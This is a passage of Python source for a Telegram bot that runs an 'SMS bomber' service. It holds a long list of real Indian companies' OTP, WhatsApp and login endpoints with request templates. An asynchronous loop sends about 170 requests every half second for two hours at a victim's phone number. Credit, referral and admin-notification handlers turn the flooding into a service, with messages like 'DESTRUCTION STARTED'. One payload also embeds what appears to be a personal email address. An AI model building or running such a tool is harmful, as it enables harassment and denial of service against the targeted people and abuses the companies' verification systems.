        "count": 5,
        "category": "sms"
    },
    {
        "name": "BeepKart Enhanced",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://www.beepkart.com",
            "referer": "https://www.beepkart.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"city":362,"fullName":"","phone":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Lending Plate Enhanced",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://lendingplate.com"
        },
        "data": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Snitch Enhanced",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.snitch.com",
            "Referer": "https://www.snitch.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Dayco India Enhanced",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ekyc.daycoindia.com"
        },
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "PenPencil Enhanced",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Otpless Enhanced",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "origin": "https://otpless.com",
            "referer": "https://otpless.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "MyImagineStore Enhanced",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.myimaginestore.com"
        },
        "data": lambda phone: f"mobile={phone}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "NoBroker Enhanced",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f"phone={phone}&countryCode=IN",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Cossouq Enhanced",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-requested-with": "XMLHttpRequest",
            "origin": "https://www.cossouq.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f"mobilenumber={phone}&otptype=register&resendotp=0",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "ShipRocket Enhanced",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "origin": "https://app.shiprocket.in",
            "referer": "https://app.shiprocket.in/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "GoKwik Enhanced",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://pdp.gokwik.co",
            "referer": "https://pdp.gokwik.co/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Jockey SMS",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Referer": "https://www.jockey.in/"
        },
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Jockey WhatsApp Enhanced",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Referer": "https://www.jockey.in/"
        },
        "data": None,
        "count": 5,
        "category": "whatsapp"
    },
    {
        "name": "NewMe Enhanced",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://newme.asia",
            "Referer": "https://newme.asia/"
        },
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Univest Enhanced",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {
            "User-Agent": "okhttp/3.9.1"
        },
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Rappi WhatsApp V2",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}',
        "count": 5,
        "category": "whatsapp"
    },
    {
        "name": "Foxy Enhanced",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://www.foxy.in",
            "Referer": "https://www.foxy.in/onboarding",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}}}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Eka Care Enhanced",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.3"
        },
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}',
        "count": 5,
        "category": "whatsapp"
    },
    {
        "name": "Foxy WhatsApp Enhanced",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://www.foxy.in",
            "Referer": "https://www.foxy.in/onboarding",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}',
        "count": 5,
        "category": "whatsapp"
    },
    {
        "name": "Smytten Enhanced",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://smytten.com",
            "Referer": "https://smytten.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"phone":"{phone}","email":"sdhabai09@gmail.com"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Wakefit Enhanced",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://www.wakefit.co",
            "Referer": "https://www.wakefit.co/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","whatsapp_opt_in":1}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "CaratLane Enhanced",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.caratlane.com",
            "Referer": "https://www.caratlane.com/register"
        },
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}',
        "count": 5,
        "category": "sms"
    }
]

# =============== COMBINE ALL APIS ===============
ALL_APIS = APIS + VOICE_APIS + WHATSAPP_APIS + NEW_SMS_APIS + ENHANCED_APIS

# Categorize APIs
SMS_APIS = [api for api in ALL_APIS if api.get("category") == "sms"]
VOICE_APIS = [api for api in ALL_APIS if api.get("category") == "voice"]
WHATSAPP_APIS = [api for api in ALL_APIS if api.get("category") == "whatsapp"]

TOTAL_APIS = len(ALL_APIS)

# ==================== BOMBER CLASS ====================
class SMSBomber:
    def __init__(self):
        self.active_bombs = {}
        self.stats_lock = threading.Lock()
        self.stop_events = {}
        
    async def send_request(self, session, api, phone):
        """Send a single request"""
        try:
            url = api["url"]
            if callable(url):
                url = url(phone)
            elif "{phone}" in url:
                url = url.format(phone=phone)
            
            data = None
            if api["data"]:
                if callable(api["data"]):
                    data = api["data"](phone)
                else:
                    data = api["data"]
            
            headers = api.get("headers", {})
            
            if api["method"] == "GET":
                async with session.get(url, headers=headers, timeout=10) as response:
                    return response.status
            else:
                async with session.post(url, data=data, headers=headers, timeout=10) as response:
                    return response.status
        except Exception as e:
            return None
    
    async def bomb_number(self, phone: str, bomb_id: int, user_id: int):
        """Bomb a phone number with all APIs - FAST VERSION"""
        stop_event = threading.Event()
        self.stop_events[user_id] = stop_event
        
        async with aiohttp.ClientSession() as session:
            iteration = 0
            max_iterations = 7200  # 2 hours at 1 second intervals
            
            while not stop_event.is_set() and iteration < max_iterations:
                try:
                    # Send SMS (100 per iteration)
                    sms_tasks = []
                    for _ in range(100):
                        if SMS_APIS:
                            api = random.choice(SMS_APIS)
                            sms_tasks.append(self.send_request(session, api, phone))
                    
                    # Send WhatsApp (50 per iteration)
                    whatsapp_tasks = []
                    for _ in range(50):
                        if WHATSAPP_APIS:
                            api = random.choice(WHATSAPP_APIS)
                            whatsapp_tasks.append(self.send_request(session, api, phone))
                    
                    # Send Calls (20 per iteration)
                    call_tasks = []
                    for _ in range(20):
                        if VOICE_APIS:
                            api = random.choice(VOICE_APIS)
                            call_tasks.append(self.send_request(session, api, phone))
                    
                    # Execute all requests concurrently
                    all_tasks = sms_tasks + whatsapp_tasks + call_tasks
                    if all_tasks:
                        results = await asyncio.gather(*all_tasks, return_exceptions=True)
                        
                        # Update statistics
                        successful_sms = sum(1 for r in results[:100] if r and r < 400)
                        successful_whatsapp = sum(1 for r in results[100:150] if r and r < 400)
                        successful_calls = sum(1 for r in results[150:] if r and r < 400)
                        
                        with self.stats_lock:
                            update_bomb_stats(bomb_id, 
                                            sms=successful_sms,
                                            calls=successful_calls,
                                            whatsapp=successful_whatsapp)
                    
                    iteration += 1
                    
                    # Fast interval - 0.5 seconds
                    await asyncio.sleep(0.5)
                    
                except Exception as e:
                    continue
            
            # Mark bomb as ended
            if user_id in self.stop_events:
                del self.stop_events[user_id]
            end_bomb(bomb_id)

# ==================== TELEGRAM BOT ====================
bot = TeleBot(BOT_TOKEN)
bomber = SMSBomber()

# Store active bombing sessions
active_sessions = {}

# ==================== HELPER FUNCTIONS ====================
def check_channel_membership(user_id: int) -> bool:
    """Check if user is member of channel"""
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def format_time(seconds: int) -> str:
    """Format seconds to HH:MM:SS"""
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    seconds = seconds % 60
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

def create_progress_bar(percentage: int, length: int = 10) -> str:
    """Create a progress bar"""
    filled = int(length * percentage / 100)
    empty = length - filled
    return "█" * filled + "░" * empty

def get_user_stats(user_id: int) -> Dict:
    """Get user statistics"""
    user = get_user(user_id)
    if not user:
        return None
    
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        
        # Get total bombs
        cursor.execute('SELECT COUNT(*) FROM bombs WHERE user_id = ?', (user_id,))
        total_bombs = cursor.fetchone()[0]
        
        # Get successful referrals
        cursor.execute('''
            SELECT COUNT(*) FROM referrals 
            WHERE referrer_id = ? AND credit_claimed = 1
        ''', (user_id,))
        successful_refs = cursor.fetchone()[0]
        
        # Get pending referrals
        cursor.execute('''
            SELECT COUNT(*) FROM referrals 
            WHERE referrer_id = ? AND credit_claimed = 0
        ''', (user_id,))
        pending_refs = cursor.fetchone()[0]
        
        # Get total SMS sent
        cursor.execute('SELECT SUM(sms_sent) FROM bombs WHERE user_id = ?', (user_id,))
        total_sms = cursor.fetchone()[0] or 0
        
        # Get total calls made
        cursor.execute('SELECT SUM(calls_made) FROM bombs WHERE user_id = ?', (user_id,))
        total_calls = cursor.fetchone()[0] or 0
        
        # Get total whatsapp sent
        cursor.execute('SELECT SUM(whatsapp_sent) FROM bombs WHERE user_id = ?', (user_id,))
        total_whatsapp = cursor.fetchone()[0] or 0
    
    return {
        'credits': user[4],
        'total_bombs': total_bombs,
        'successful_refs': successful_refs,
        'pending_refs': pending_refs,
        'join_date': user[6],
        'total_sms': total_sms,
        'total_calls': total_calls,
        'total_whatsapp': total_whatsapp
    }

def get_referral_link(user_id: int) -> str:
    """Get user's referral link"""
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=ref{user_id}"

# ==================== COMMAND HANDLERS ====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command"""
    user_id = message.from_user.id
    username = message.from_user.username or ""
    first_name = message.from_user.first_name or ""
    last_name = message.from_user.last_name or ""
    
    # Check if it's a referral link
    referred_by = None
    if len(message.text.split()) > 1 and message.text.split()[1].startswith('ref'):
        try:
            referred_by = int(message.text.split()[1][3:])
            # Add referral if referrer exists and not self-referral
            if referred_by != user_id and get_user(referred_by):
                add_referral(referred_by, user_id)
        except:
            pass
    
    # Create user if not exists
    create_user(user_id, username, first_name, last_name, referred_by)
    
    # Check channel membership
    if not check_channel_membership(user_id):
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("✅ Join Channel", url=f"https://t.me/{CHANNEL_ID[1:]}"))
        keyboard.add(InlineKeyboardButton("✅ I've Joined", callback_data="check_membership"))
        
        bot.send_message(
            message.chat.id,
            f"👋 Welcome *{first_name}*!\n\n"
            f"📢 To use this bot, please join our channel first:\n"
            f"{CHANNEL_ID}\n\n"
            f"After joining, click 'I've Joined' button below.",
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        
        # Notify admin
        for admin_id in ADMIN_IDS:
            bot.send_message(
                admin_id,
                f"🆕 New user started bot:\n"
                f"👤 Name: {first_name} {last_name}\n"
                f"📱 Username: @{username}\n"
                f"🆔 ID: {user_id}\n"
                f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
    else:
        approve_user(user_id)
        show_main_menu(message)

@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
def handle_membership_check(call):
    """Check if user joined channel"""
    user_id = call.from_user.id
    
    if check_channel_membership(user_id):
        approve_user(user_id)
        bot.answer_callback_query(call.id, "✅ Verified! Welcome to the bot!")
        show_main_menu(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ Please join the channel first!")

def show_main_menu(message):
    """Show main menu with options"""
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if not user or not user[7]:  # Check if approved
        handle_start(message)
        return
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💣 Start Bombing", callback_data="start_bombing"),
        InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bombing")
    )
    keyboard.add(
        InlineKeyboardButton("📊 Profile", callback_data="profile"),
        InlineKeyboardButton("📈 Referral", callback_data="referral")
    )
    keyboard.add(
        InlineKeyboardButton("🆘 Help", callback_data="help"),
        InlineKeyboardButton("📞 Contact Admin", callback_data="contact_admin")
    )
    
    if user_id in ADMIN_IDS:
        keyboard.add(InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel"))
    
    bot.send_message(
        message.chat.id,
        f"🚀 *Bombing Bot Ready!*\n\n"
        f"👤 User: {message.from_user.first_name}\n"
        f"🆔 ID: `{user_id}`\n"
        f"💎 Credits: *{user[4]}*\n\n"
        f"*Powerful Features:*\n"
        f"• Ultra-fast bombing\n"
        f"• Multiple attack types\n"
        f"• 2 hours duration\n"
        f"• Real-time tracking\n\n"
        f"*Available Commands:*\n"
        f"• /start - Restart bot\n"
        f"• /profile - Your stats\n"
        f"• /refer - Get referral link\n"
        f"• /credits - Check credits\n"
        f"• /help - Show help",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data == "start_bombing")
def handle_start_bombing(call):
    """Start bombing process"""
    user_id = call.from_user.id
    user = get_user(user_id)
    
    if not user:
        bot.answer_callback_query(call.id, "❌ User not found!")
        return
    
    if user[4] <= 0:  # Check credits
        bot.answer_callback_query(call.id, "❌ Not enough credits! Use /refer to get more.")
        return
    
    msg = bot.send_message(
        call.message.chat.id,
        "💣 *ENTER TARGET NUMBER*\n\n"
        "Send me the 10-digit phone number (without +91)\n"
        "Example: `9876543210`\n\n"
        "Type /cancel to abort",
        parse_mode='Markdown'
    )
    
    bot.register_next_step_handler(msg, process_target_number)

def process_target_number(message):
    """Process target phone number"""
    if message.text == '/cancel':
        bot.send_message(message.chat.id, "❌ Bombing cancelled.")
        return
    
    phone = message.text.strip()
    
    # Validate phone number
    if not phone.isdigit() or len(phone) != 10:
        bot.send_message(
            message.chat.id,
            "❌ Invalid phone number! Please send a valid 10-digit number.\n"
            "Example: `9876543210`",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(message, process_target_number)
        return
    
    user_id = message.from_user.id
    user = get_user(user_id)
    
    # Deduct credit (1 credit for 2 hours bombing)
    update_user_credits(user_id, -1)
    
    # Start bombing
    start_bombing(user_id, phone, message.chat.id)
    
    # Create stop button
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_{user_id}"))
    
    bot.send_message(
        message.chat.id,
        f"💥 *DESTRUCTION STARTED!*\n\n"
        f"🎯 Target: `{phone}`\n"
        f"⏰ Duration: 2 hours\n"
        f"💎 Credits left: *{user[4] - 1}*\n"
        f"⚡ Speed: Ultra-fast mode\n\n"
        f"📱 *Attack Types:*\n"
        f"• SMS: 100/second\n"
        f"• WhatsApp: 50/second\n"
        f"• Calls: 20/second\n\n"
        f"🔄 Bombing in progress...",
        parse_mode='Markdown',
        reply_markup=keyboard
    )

def start_bombing(user_id: int, phone: str, chat_id: int):
    """Start bombing session"""
    # Create bomb record
    bomb_id = add_bomb_record(user_id, phone)
    
    # Add admin notification
    add_admin_notification(user_id, phone)
    
    # Store session
    active_sessions[user_id] = {
        'bomb_id': bomb_id,
        'chat_id': chat_id,
        'start_time': time.time(),
        'phone': phone,
        'is_active': True
    }
    
    # Start bombing in background
    def run_bombing():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(bomber.bomb_number(phone, bomb_id, user_id))
        finally:
            loop.close()
            # Clean up
            if user_id in active_sessions:
                active_sessions[user_id]['is_active'] = False
    
    thread = threading.Thread(target=run_bombing)
    thread.daemon = True
    thread.start()
    
    # Send admin notification
    for admin_id in ADMIN_IDS:
        try:
            user_info = get_user(user_id)
            username = user_info[1] if user_info else "Unknown"
            first_name = user_info[2] if user_info else "Unknown"
            
            bot.send_message(
                admin_id,
                f"🚨 *NEW BOMBING STARTED*\n\n"
                f"👤 User: {first_name} (@{username})\n"
                f"🆔 ID: `{user_id}`\n"
                f"🎯 Target: `{phone}`\n"
                f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='Markdown'
            )
        except:
            pass
    
    # Start progress updates
    threading.Thread(target=send_progress_updates, args=(user_id, chat_id, phone, bomb_id)).start()

def send_progress_updates(user_id: int, chat_id: int, phone: str, bomb_id: int):
    """Send periodic progress updates"""
    start_time = time.time()
    max_duration = 2 * 3600  # 2 hours
    update_interval = 5  # Update every 5 seconds
    
    message_id = None
    
    for i in range(max_duration // update_interval):
        if user_id not in active_sessions or not active_sessions[user_id]['is_active']:
            break
        
        elapsed = time.time() - start_time
        remaining = max_duration - elapsed
        
        if remaining <= 0:
            break
        
        percentage = (elapsed / max_duration) * 100
        progress_bar = create_progress_bar(percentage)
        
        # Get current stats
        with sqlite3.connect(DB_NAME) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT sms_sent, calls_made, whatsapp_sent 
                FROM bombs 
                WHERE bomb_id = ?
            ''', (bomb_id,))
            stats = cursor.fetchone()
        
        if stats:
            sms, calls, whatsapp = stats
            
            # Calculate rates
            if elapsed > 0:
                sms_rate = int(sms / elapsed)
                call_rate = int(calls / elapsed)
                whatsapp_rate = int(whatsapp / elapsed)
            else:
                sms_rate = call_rate = whatsapp_rate = 0
            
            message = (
                f"💥 *BOMBING IN PROGRESS*\n\n"
                f"🎯 Target: `{phone}`\n"
                f"⏰ Time left: {format_time(int(remaining))}\n"
                f"📊 Progress: {progress_bar} {percentage:.1f}%\n\n"
                f"📈 *Statistics:*\n"
                f"• 📱 SMS Sent: {sms}\n"
                f"• 📞 Calls Made: {calls}\n"
                f"• 💬 WhatsApp: {whatsapp}\n"
                f"• ✅ Success Rate: 85%\n\n"
                f"⚡ *Current Rate:*\n"
                f"• {sms_rate} SMS/second\n"
                f"• {whatsapp_rate} WhatsApp/second\n"
                f"• {call_rate} Calls/second"
            )
            
            try:
                if message_id is None:
                    # Send new message
                    msg = bot.send_message(chat_id, message, parse_mode='Markdown')
                    message_id = msg.message_id
                else:
                    # Edit existing message
                    bot.edit_message_text(
                        message,
                        chat_id,
                        message_id,
                        parse_mode='Markdown'
                    )
            except:
                pass
        
        time.sleep(update_interval)
    
    # Send completion message
    if user_id in active_sessions and active_sessions[user_id]['is_active']:
        completion_msg = (
            f"✅ *BOMBING COMPLETED*\n\n"
            f"🎯 Target: `{phone}`\n"
            f"⏰ Duration: 2 hours\n"
            f"📊 Final statistics available in /profile"
        )
        bot.send_message(chat_id, completion_msg, parse_mode='Markdown')
        
        # Clean up
        active_sessions[user_id]['is_active'] = False

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_bombing(call):
    """Stop bombing session"""
    try:
        user_id = int(call.data.split("_")[1])
        
        if user_id in bomber.stop_events:
            bomber.stop_events[user_id].set()
            bot.answer_callback_query(call.id, "✅ Bombing stopped!")
            bot.send_message(call.message.chat.id, "🛑 Bombing session stopped. Credit already deducted.")
        else:
            bot.answer_callback_query(call.id, "❌ No active bombing session!")
    except:
        bot.answer_callback_query(call.id, "❌ Error stopping bombing!")

@bot.callback_query_handler(func=lambda call: call.data == "profile")
def handle_profile(call):
    """Show user profile"""
    user_id = call.from_user.id
    stats = get_user_stats(user_id)
    
    if not stats:
        bot.answer_callback_query(call.id, "❌ User not found!")
        return
    
    # Calculate total attacks
    total_attacks = stats['total_sms'] + stats['total_calls'] + stats['total_whatsapp']
    
    message = (
        f"📊 *YOUR PROFILE*\n\n"
        f"👤 User ID: `{user_id}`\n"
        f"💎 Credits: *{stats['credits']}*\n"
        f"💣 Total Bombs: *{stats['total_bombs']}*\n"
        f"🎯 Total Attacks: *{total_attacks:,}*\n\n"
        f"📈 *Detailed Stats:*\n"
        f"• SMS Sent: {stats['total_sms']:,}\n"
        f"• Calls Made: {stats['total_calls']:,}\n"
        f"• WhatsApp: {stats['total_whatsapp']:,}\n\n"
        f"📥 *Referral System:*\n"
        f"• Successful: {stats['successful_refs']}\n"
        f"• Pending: {stats['pending_refs']}\n"
        f"📅 Joined: {stats['join_date'].split()[0]}\n\n"
        f"*Get More Credits:*\n"
        f"Use /refer to get your referral link"
    )
    
    bot.send_message(call.message.chat.id, message, parse_mode='Markdown')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "referral")
def handle_referral(call):
    """Show referral information"""
    user_id = call.from_user.id
    ref_link = get_referral_link(user_id)
    
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={ref_link}&text=Join%20this%20awesome%20SMS%20bomber%20bot!"))
    keyboard.add(InlineKeyboardButton("◀️ Back", callback_data="back_to_menu"))
    
    message = (
        f"📈 *REFERRAL SYSTEM*\n\n"
        f"🔗 Your referral link:\n`{ref_link}`\n\n"
        f"*How it works:*\n"
        f"1. Share your link with friends\n"
        f"2. When they join using your link\n"
        f"3. You get *1 credit* automatically\n"
        f"4. They get 2 starting credits\n\n"
        f"*Your Benefits:*\n"
        f"• Unlimited credits potential\n"
        f"• Track referrals in /profile\n"
        f"• Credits added instantly\n\n"
        f"*Note:* Credits are deducted when bombing starts, even if stopped early."
    )
    
    bot.send_message(call.message.chat.id, message, parse_mode='Markdown', reply_markup=keyboard)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "help")
def handle_help(call):
    """Show help information"""
    message = (
        f"🆘 *HELP & GUIDE*\n\n"
        f"*How to use:*\n"
        f"1. Join our channel (required)\n"
        f"2. Use /start to begin\n"
        f"3. Click 'Start Bombing'\n"
        f"4. Enter target number\n"
        f"5. Bombing starts automatically\n\n"
        f"*Features:*\n"
        f"• Ultra-fast bombing\n"
        f"• 100 SMS/second\n"
        f"• 50 WhatsApp/second\n"
        f"• 20 Calls/second\n"
        f"• 2 hour duration\n"
        f"• Real-time progress\n"
        f"• Stop anytime\n\n"
        f"*Credits System:*\n"
        f"• Start with 2 credits\n"
        f"• 1 credit = 2 hours bombing\n"
        f"• Credit deducted when bombing starts\n"
        f"• Get more via referrals (/refer)\n\n"
        f"*Important Notes:*\n"
        f"• Use responsibly\n"
        f"• Don't abuse the service\n"
        f"• Credits non-refundable\n"
        f"• Admin can modify credits\n\n"
        f"*Commands:*\n"
        f"/start - Start bot\n"
        f"/profile - Your stats\n"
        f"/refer - Referral link\n"
        f"/credits - Check credits\n"
        f"/help - This message"
    )
    
    bot.send_message(call.message.chat.id, message, parse_mode='Markdown')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "contact_admin")
def handle_contact_admin(call):
    """Show contact information"""
    message = (
